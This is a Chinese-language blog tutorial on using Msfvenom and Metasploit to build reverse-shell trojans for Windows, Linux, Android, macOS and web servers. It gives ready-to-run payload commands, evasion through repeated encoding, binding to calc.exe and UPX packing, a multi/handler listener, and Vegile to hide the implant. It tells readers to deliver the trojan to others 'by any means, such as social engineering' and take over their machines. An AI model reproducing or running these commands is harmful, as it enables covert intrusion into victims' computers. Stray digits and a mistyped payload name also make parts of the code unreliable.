**目录**

[Msfvenom](#t0 "Msfvenom")

[生成exe木马](#t1 "生成exe木马")

[生成Linux木马](#t2 "生成Linux木马")

[方法一：](#t3 "方法一：")

[方法二：](#t4 "方法二：")

* * *

在前一篇文章中我讲了什么是Meterpreter，并且讲解了Meterpreter的用法。传送门——>[Metasploit之Meterpreter](https://blog.csdn.net/qq_36119192/article/details/83215257#Meterpreter "Metasploit之Meterpreter")

今天我要讲的是我们用Msfvenom制作一个[木马](https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020)，发送给其他主机，只要其他主机运行了该木马，就会自动连接到我们的主机，并且建立一条TCP连接。我们可以通过这条TCP连接控制目标主机。

**Msfvenom**
============

*   –p (- -payload-options)：添加载荷payload。载荷这个东西比较多，这个软件就是根据对应的载荷payload生成对应平台下的后门
*   \--lhost：VPS的地址
*   \--lport：VPS监听的端口
*   –a：选择架构平台  x86 、x64 、 x86\_64
*   \--platform：选择平台，windows、Linux
*   –e：使用编码进行免杀，如使用 x86/shikata\_ga\_nai 编码
*   –i：编码的次数
*   –b：避免使用的字符 例如：不使用 '\\x00\\'。
*   PrependMigrate=true PrependMigrateProc=svchost.exe：使这个木马默认会迁移到 svchost.exe 进程
*   –f ：输出文件格式，如 exe、c、elf、macho、raw、asp、aspx、
*   –l：查看所有payload encoder nops。
*   –o：文件输出
*   –s：生成payload的最大长度，就是文件大小。
*   –c：添加自己的shellcode
*   –x | -k：捆绑

![](https://img-blog.csdnimg.cn/20181206234950273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
安卓app:      
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888 -o ~/Desktop/test2.apk        
Linux:      
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f  elf > shell.elf      
Mac:      
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f macho >  shell.macho      
PHP：      
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.20.27 LPORT=4444 -f raw -o test.php      
ASP:      1
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888  -f asp > shell.asp      1
ASPX：      1
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888  -f  aspx > shell.aspx      1
JSP:      1
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f  raw > shell.jsp      1
Bash：      1
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.10.27 LPORT=8888 -f   raw > shell.sh      1
Perl      1
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.10.27 LPORT=8888 -f raw > shell.pl      1
Python      2
msfvenom -p python/meterpreter/reverser_tcp LHOST=192.168.10.27 LPORT=8888 -f   raw > shell.py
```


**生成exe木马**
-----------

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.27 lport=8888 -f exe -o test.exe  #lhost是我们的主机ip，lport是我们主机的用于监听的端口       
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.27 lport=8888 -i 3 -e x86/shikata_ga_nai  -f exe -o test.exe  #编码3次
```


![](https://img-blog.csdnimg.cn/20181205105401849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后会在该目录下生成一个test.exe的木马。

```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -i 20 lhost=192.168.10.11 lport=8888 -x calc.exe -f exe -o test.exe      #编码20次、捆绑正常的32位calc.exe，生成32位的test.exe文件
```


![](https://img-blog.csdnimg.cn/20190928103916453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**利用 upx 加壳**

```
upx -9 test.exe -k -o test2.exe
```


![](https://img-blog.csdnimg.cn/20190928105128450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

接下来，我们运行 msfconsole 进入MSF控制台，然后输入以下命令

```
msf > use exploit/multi/handler  #使用exploit/multi/handler监听从肉鸡发来的数据      
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp  #设置payload，不同的木马设置不同的payload      
msf exploit(handler) > set lhost 192.168.10.15  #我们的主机ip      
msf exploit(handler) > set lport 8888            #我们的主机端口      
msf exploit(handler) > exploit
```


![](https://img-blog.csdnimg.cn/20181205105951298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后，将木马发送给其他人，无论使用什么手段(可以使用社会工程学)让其在其他主机上运行，我们这边就会接收到反弹过来的session。

因为我们刚刚把进程挂在后台，所以我们输入：**sessions  -l**  可以查看到我们得到的shell，使用 sessions -i  1 可以进入指定的shell，我们这里只有一个，所以id为1。如图，我们成功拿到了其他主机的shell

![](https://img-blog.csdnimg.cn/20181205105940219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

生成Linux木马
---------

### 方法一：

执行以下命令会生成一个elf文件

```
#生成32位的马      
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=VPS的地址  LPORT=8888 -f elf > test.elf      
#生成64位的马      
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=VPS的地址  LPORT=8888 -f elf > test.elf
```


![](https://img-blog.csdnimg.cn/2020043022481762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后MSF开启监听

```
use exploit/multi/handler      
set payload linux/x64/meterpreter/reverse_tcp      
set LHOST 0.0.0.0      
set LPORT 8888      
exploit -j
```


![](https://img-blog.csdnimg.cn/20200430230050572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

将该elf文件上传到目标机器，添加可执行权限，然后执行即可

![](https://img-blog.csdnimg.cn/20200430230300463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 方法二：

首先，在我们的Kali上生成一个Linux类型的木马test

```
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=VPS的地址 LPORT=8888 -b "\x00" -f elf -o test
```


![](https://img-blog.csdnimg.cn/20200403224027841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

在目标机器上下载Vegile，命令如下，然后将 test 传到Vegile目录下

```
git clone https://github.com/Screetsec/Vegile.git      
cd Vegile      
chmod +x Vegile
```


 ![](https://img-blog.csdnimg.cn/20200403224429147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

在Kali上开启监听如下

```
use exploit/multi/hander      
set payload linux/x86/shell/reverse_tcp      
set lhost 192.168.10.13      
set lport 8888      
exploit -j
```


![](https://img-blog.csdnimg.cn/20200403224308970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后在目标及执行如下

```
./Vegile --u test      
或      
./Vegile --i test
```


![](https://img-blog.csdnimg.cn/20200403224521666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后我们的VPS就可以收到目标机器弹回来的shell了。

![](https://img-blog.csdnimg.cn/2020040322472946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

关于后渗透阶段如何使用Meterpreter，传送门——>[后渗透阶段Meterpreter的使用](https://blog.csdn.net/qq_36119192/article/details/83215257#%E5%90%8E%E6%B8%97%E9%80%8F%E6%88%AA%E6%96%AD%C2%A0 "后渗透阶段Meterpreter的使用")

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)